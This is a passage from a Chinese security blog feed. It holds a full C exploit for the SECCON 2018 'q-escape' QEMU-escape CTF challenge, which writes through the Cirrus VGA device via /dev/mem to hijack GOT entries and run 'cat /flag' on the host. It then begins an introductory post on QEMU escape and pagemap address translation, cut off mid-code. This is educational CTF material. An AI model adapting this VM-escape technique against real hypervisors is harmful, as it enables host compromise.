class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> vga_addr = <span class="number">0xa0000</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> vga_size = <span class="number">0x20000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *vga_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_sr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(idx, <span class="number">0x3c4</span>);</span><br><span class="line">    outb(val, <span class="number">0x3c5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vga_mem_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint8_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint8_t</span> *)(vga_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_latch</span><span class="params">(<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    a = vga_mem[(value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>]; <span class="comment">// write hight</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    a = vga_mem[value &amp; <span class="number">0xffff</span>]; <span class="comment">// write low</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vga_mem = mmap(<span class="literal">NULL</span>, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr);</span><br><span class="line">    <span class="keyword">if</span> (!vga_mem)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioperm(<span class="number">0x3b0</span>, <span class="number">0x30</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;cannot ioperm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">7</span>, <span class="number">1</span>);       <span class="comment">// bypass first if</span></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">4</span>);    <span class="comment">// v7==4</span></span><br><span class="line">    set_sr(<span class="number">0xcd</span>, <span class="number">0x10</span>); <span class="comment">// vs[0x10]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> bss = <span class="number">0x109e000</span> + <span class="number">0x500</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_logfile = <span class="number">0x10CCBE0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> vfprintf_got = <span class="number">0xee7bb0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> system_plt = <span class="number">0x409dd0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> printf_chk_got = <span class="number">0xee7028</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_log = <span class="number">0x9726E8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cat_flag[] = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span> cur_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    a = vga_mem[<span class="number">1</span>];</span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    set_latch(bss);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;cat_flag[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, cat_flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(qemu_logfile - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;bss;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(vfprintf_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;system_plt;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(printf_chk_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;qemu_log;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">2</span>);</span><br><span class="line">    vga_mem_write(<span class="number">0x18100</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315163823703.png"                      alt="image-20230315163823703"                ></p><hr><p>å‚è€ƒé“¾æ¥:<br>  <a class="link"   href="https://www.anquanke.com/post/id/224199#h3-11" >https://www.anquanke.com/post/id/224199#h3-11<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://devcraft.io/2018/11/22/q-escape-seccon-2018.html" >https://devcraft.io/2018/11/22/q-escape-seccon-2018.html<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h<i class="fas fa-external-link-alt"></i></a><br>é¢˜ç›®é“¾æ¥:<br>  <a class="link"   href="https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip" >https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è®¸ä¹…æ²¡æœ‰æ›´æ–°ï¼Œå‰æ®µæ—¶é—´ä¸€ç›´è€ƒè¯•æ‰€ä»¥ä¸€ç›´æ‹–ç€äº†ã€‚&lt;/p&gt;
&lt;h2 id=&quot;è®¾å¤‡åˆ†æ&quot;&gt;&lt;a href=&quot;#è®¾å¤‡åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;è®¾å¤‡åˆ†æ&quot;&gt;&lt;/a&gt;è®¾å¤‡åˆ†æ&lt;/h2&gt;&lt;p&gt;é¦–å…ˆçœ‹çœ‹å¼€äº†ä»€ä¹ˆä¿æŠ¤&lt;/p&gt;
&lt;figure class=&quot;h</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="mmio" scheme="https://cv196082.gitee.io/tags/mmio/"/>
    
    <category term="pmio" scheme="https://cv196082.gitee.io/tags/pmio/"/>
    
    <category term="vga" scheme="https://cv196082.gitee.io/tags/vga/"/>
    
  </entry>
  
  <entry>
    <title>qemué€ƒé€¸å…¥é—¨</title>
    <link href="https://cv196082.gitee.io/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/"/>
    <id>https://cv196082.gitee.io/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/</id>
    <published>2023-02-05T09:39:57.000Z</published>
    <updated>2023-03-21T07:58:23.390Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆæ€»æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œqemuæ˜¯ä¸€ä¸ªå¼€æºçš„æ¨¡æ‹Ÿå™¨å’Œè™šæ‹Ÿæœºï¼Œé€šè¿‡åŠ¨æ€çš„äºŒè¿›åˆ¶è½¬æ¢æ¥æ¨¡æ‹Ÿ CPUçš„å·¥å…·ã€‚</p><p>åœ¨å®é™…çš„ç¯å¢ƒä¸­ï¼Œqemuæœ‰å¤šç§è¿è¡Œæ¨¡å¼ï¼Œåœ¨ä»¥å¾€å¯ä»¥ä½¿ç”¨User modeè°ƒè¯•armã€mipsæ¶æ„çš„äºŒè¿›åˆ¶ç¨‹åºã€‚ä¹Ÿåœ¨kernel pwnä¸­ç”¨System modeè°ƒè¯•å®Œæ•´çš„è®¡ç®—æœºç³»ç»Ÿã€‚è€Œqemué€ƒé€¸çš„é¢˜ç›®æŒ‡çš„å°±æ˜¯System modeè¿™ç§æ¨¡å¼ï¼Œé¢˜ç›®çš„å½¢å¼ä¸»è¦æ˜¯ç»™å‡ºå­˜åœ¨æ¼æ´çš„è®¾å¤‡ç„¶ååŠ ä»¥åˆ©ç”¨ã€‚</p><h2 id="qemuçš„å†…å­˜ç»“æ„"><a href="#qemuçš„å†…å­˜ç»“æ„" class="headerlink" title="qemuçš„å†…å­˜ç»“æ„"></a>qemuçš„å†…å­˜ç»“æ„</h2><p>qemuä½¿ç”¨mmapä¸ºè™šæ‹Ÿæœºç”³è¯·å‡ºç›¸åº”å¤§å°çš„å†…å­˜ï¼Œå½“åšè™šæ‹Ÿæœºçš„ç‰©ç†å†…å­˜ï¼Œä¸”è¿™éƒ¨åˆ†å†…å­˜æ²¡æœ‰æ‰§è¡Œæƒé™ã€‚</p><h3 id="qemuçš„åœ°å€è½¬åŒ–"><a href="#qemuçš„åœ°å€è½¬åŒ–" class="headerlink" title="qemuçš„åœ°å€è½¬åŒ–"></a>qemuçš„åœ°å€è½¬åŒ–</h3><p>ç”¨æˆ·è™šæ‹Ÿåœ°å€-&gt;ç”¨æˆ·ç‰©ç†åœ°å€</p><p>ç”¨æˆ·ç‰©ç†åœ°å€-&gt;qemuçš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼šè¿™é‡Œæ˜¯å°†ç”¨æˆ·çš„ç‰©ç†åœ°å€è½¬åŒ–ä¸ºqemuä½¿ç”¨mmapç”³è¯·å‡ºæ¥çš„åœ°å€ç©ºé—´ï¼Œè€Œè¿™éƒ¨åˆ†ç©ºé—´çš„å†…å®¹ä¸ç”¨æˆ·çš„ç‰©ç†åœ°å€ä¸€ä¸€å¯¹åº”ã€‚</p><p>åœ¨ x64 ç³»ç»Ÿä¸Šï¼Œè™šæ‹Ÿåœ°å€ç”± page offset (bits 0-11) å’Œ page number ç»„æˆï¼Œ/proc/$pid/pagemap è¿™ä¸ªæ–‡ä»¶ä¸­å‚¨å­˜ç€æ­¤è¿›ç¨‹çš„é¡µè¡¨ï¼Œè®©ç”¨æˆ·ç©ºé—´è¿›ç¨‹å¯ä»¥æ‰¾å‡ºæ¯ä¸ªè™šæ‹Ÿé¡µé¢æ˜ å°„åˆ°å“ªä¸ªç‰©ç†å¸§ï¼ˆéœ€è¦ CAP_SYS_ADMIN æƒé™ï¼‰ï¼Œå®ƒåŒ…å«ä¸€ä¸ª 64 ä½çš„å€¼ï¼ŒåŒ…å«ä»¥ä¸‹çš„æ•°æ®ã€‚</p><ul><li>  Bits 0-54 page frame number (PFN) if present</li><li>  Bits 0-4 swap type if swapped</li><li>  Bits 5-54 swap offset if swapped</li><li>  Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</li><li>  Bit 56 page exclusively mapped (since 4.2)</li><li>  Bits 57-60 zero</li><li>  Bit 61 page is file-page or shared-anon (since 3.5)</li><li>  Bit 62 page swapped</li><li>  Bit 63 page present</li></ul><p>æ ¹æ®ä»¥ä¸Šä¿¡æ¯ï¼Œåˆ©ç”¨<code>/proc/pid/pagemap</code>å¯å°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1ã€ è®¡ç®—è™šæ‹Ÿåœ°å€æ‰€åœ¨è™šæ‹Ÿé¡µå¯¹åº”çš„æ•°æ®é¡¹åœ¨<code>/proc/pid/pagemap</code>ä¸­çš„åç§»ï¼Œ<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p><p>2ã€ è¯»å–é•¿åº¦ä¸º<code>64bits</code>çš„æ•°æ®é¡¹</p><p>3ã€ æ ¹æ®<code>Bit 63</code> åˆ¤æ–­ç‰©ç†å†…å­˜é¡µæ˜¯å¦å­˜åœ¨</p><p>4ã€ è‹¥ç‰©ç†å†…å­˜é¡µå·²å­˜åœ¨ï¼Œåˆ™å–<code>bits 0-54</code>ä½œä¸ºç‰©ç†é¡µå·</p><p>5ã€ è®¡ç®—å‡ºç‰©ç†é¡µèµ·å§‹åœ°å€åŠ ä¸Šé¡µå†…åç§»å³å¾—åˆ°ç‰©ç†åœ°å€ï¼Œ<code>phtaddr = pageframenum * pagesize + viraddr % pagesize</code></p><p>å¯¹åº”ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *userbuf;</span><br><span class="line">    <span class="keyword">uint64_t</span> userbuf_pa;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span 